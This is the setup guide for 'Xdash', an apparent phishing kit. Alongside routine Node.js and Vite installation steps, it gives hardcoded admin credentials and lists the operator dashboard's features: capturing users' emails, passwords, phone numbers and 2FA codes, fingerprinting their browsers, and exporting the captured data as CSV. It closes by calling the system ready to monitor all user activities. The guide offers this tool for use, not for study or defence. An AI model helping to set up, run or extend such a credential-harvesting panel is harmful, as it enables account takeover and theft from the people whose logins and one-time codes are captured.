# Xdash Admin Panel - Quick Setup Guide

## 🚨 Node.js Installation Required

The error indicates that Node.js is not installed or not in your system PATH. Here are your options:

### Option 1: Install Node.js (Recommended)
1. Download Node.js from: https://nodejs.org/
2. Install the LTS version
3. Restart your command prompt/PowerShell
4. Run: `npm run dev`

### Option 2: Use the Batch File
1. Double-click `start-server.bat` in this folder
2. It will automatically find Node.js if installed
3. Or guide you through the installation process

### Option 3: Use npx (if npm is installed)
```bash
npx vite
```

### Option 4: Manual Vite Installation
```bash
npm install -g vite
vite
```

## 🔐 Admin Credentials (Ready to Use)

Once the server is running, access the admin panel:

**URL:** `http://localhost:5173/admin/login`
**Username:** `xdash_admin`
**Password:** `SecureAdmin2025!@#`

## 📊 Admin Panel Features

✅ **Real-time Data Monitoring**
- Captures emails, passwords, phone numbers, 2FA codes
- Browser fingerprinting (user agent, screen resolution)
- Session tracking with unique IDs
- Auto-refresh every 5 seconds

✅ **Advanced Dashboard**
- Search and filter captured data
- Export data as CSV
- Statistics overview
- Color-coded data visualization

✅ **Enhanced Security**
- Strong admin password
- Protected routes
- Session management

## 🔧 Troubleshooting

If you continue having issues:
1. Check if Node.js is installed: `node --version`
2. Check if npm is available: `npm --version`
3. Try using PowerShell as Administrator
4. Ensure you're in the correct directory: `c:\Users\nagac\Downloads\Xdash`

## 📱 Access URLs

- **Main App:** `http://localhost:5173/`
- **Admin Login:** `http://localhost:5173/admin/login`
- **Admin Dashboard:** `http://localhost:5173/admin/dashboard` (after login)

---
*The admin system is fully configured and ready to monitor all user activities!*
